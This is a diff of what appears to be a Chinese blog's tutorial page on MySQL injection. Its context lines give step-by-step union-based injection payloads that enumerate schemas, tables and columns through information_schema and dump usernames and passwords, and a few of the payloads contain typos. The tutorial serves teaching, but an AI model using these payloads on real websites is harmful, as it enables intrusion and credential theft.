@@ -82,7 +82,7 @@
 <meta property="og:site_name" content="简单的世界">
 <meta property="og:description" content="在讲MySQL注入的之前，我们先来了解一下什么是sql。 1、什么是sqlSQL是一个通用的、功能强大的关系数据库语言，但其功能并不仅仅是 查询,它可以用来访问和操作数据库系统。SQL 语句用于取回和更新数 据库中的数据，同时，它也是一门标准的计算机语言。 2、什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询 字符串，最终达到欺骗服务器执行恶意的S">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-06-02T08:53:59.267Z">
+<meta property="og:updated_time" content="2019-06-02T08:58:32.229Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mysql注入">
 <meta name="twitter:description" content="在讲MySQL注入的之前，我们先来了解一下什么是sql。 1、什么是sqlSQL是一个通用的、功能强大的关系数据库语言，但其功能并不仅仅是 查询,它可以用来访问和操作数据库系统。SQL 语句用于取回和更新数 据库中的数据，同时，它也是一门标准的计算机语言。 2、什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询 字符串，最终达到欺骗服务器执行恶意的S">
@@ -351,13 +351,13 @@ SQL语句达到代码执行从而进行攻击的技术。
 <pre><code>and 1=1 order by n    通过不断改变n的值以及观察页面的情况来确定字段数
 
 比如说n在5的时候出错了，那就说明select的字段是4个
-</code></pre><p>####判断显示位</p>
+</code></pre><p>####判断显示位####</p>
 <p>当我们得到n的值时，就可以用 union select来判断他的显示位</p>
 <pre><code>and 1=2 union select 1,2,3,4,5,....,n #
 
 注释常常使用    --+、#、%23
 </code></pre><p>一般数字会显示在页面的任何位置，如何判断它呢，和正常页面作比较，如果正常页面没有而他又有说明他就是你要找的数字。</p>
-<p>####查当前数据库</p>
+<p>####查当前数据库####</p>
 <pre><code>and 1=2 union select 1,2,3,SCHEMA_NAME from information_schema.schemata
 
 and 1=2 union select 1,2,database()
@@ -369,13 +369,13 @@ and 1=2 union select 1,2,database()
 union select 1,2,SCHEMA_NAME, from information_schema.SCHEMATA limit 0,1   #得到第一个库名
 
 union select 1,2,SCHEMA_NAME, from information_schema.SCHEMATA limit 1,1   #得到第二个库名
-</code></pre><p>####查表名<br>当我们确定了数据库时就要获取数据库的表名，所以下一步就要获取它的表名</p>
+</code></pre><p>####查表名####<br>当我们确定了数据库时就要获取数据库的表名，所以下一步就要获取它的表名</p>
 <pre><code>and 1=2 union selec 1,2,3,table_name，5 from information_schema.tables where table_schema=batabaes()/*这里就是上面的数据库*/ limit 0,1
 
 或者  union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
 
 查找所有表的语句：select table_name from information_schema.tables where table_schema=&apos;当前数据库&apos;
-</code></pre><p>####查列名<br>    我们用information_schema.columns可以获取表中的所有字段</p>
+</code></pre><p>####查列名####<br>    我们用information_schema.columns可以获取表中的所有字段</p>
 <pre><code>and 1=2 union select 1,2,3,column_name,5,6,7 from information_schema.columns where table_name=&apos;表名或者表名的十六进制&apos; limit 0,1
 
 但是有的时候后台的代码可能仅用了使用where子句，那么这个时候就无法通过information_schema.coumns来得到列名了，这个时候只能够根据你自己多年的
@@ -384,13 +384,13 @@ union select 1,2,SCHEMA_NAME, from information_schema.SCHEMATA limit 1,1   #得�
 语句：id=1 and exists(select 猜测的列名 from users)
 如果在users表中不存在就会报错或者不显示内容
 如果存在机会返回结果，那就说明users表中存在列名
-</code></pre><p>####查字段内容</p>
+</code></pre><p>####查字段内容####</p>
 <pre><code>当我们得到表名和字段名后就可以dump数据库的所有信息了，比如，查询用户名，查询密码等等，当然我们还可以脱库，下载表中所有信息
 
 and 1=2 union select 1,2,password from 表名    /*查询密码*/
 
 and 1=2 union select 1,2,username from 表名    /*用户名*/
-</code></pre><p>####脱库</p>
+</code></pre><p>####脱库####</p>
 <pre><code>比如下载users的所有数据
 
 and 1=2 union select 1,2,group_concat(username,password),4 from users(表名)
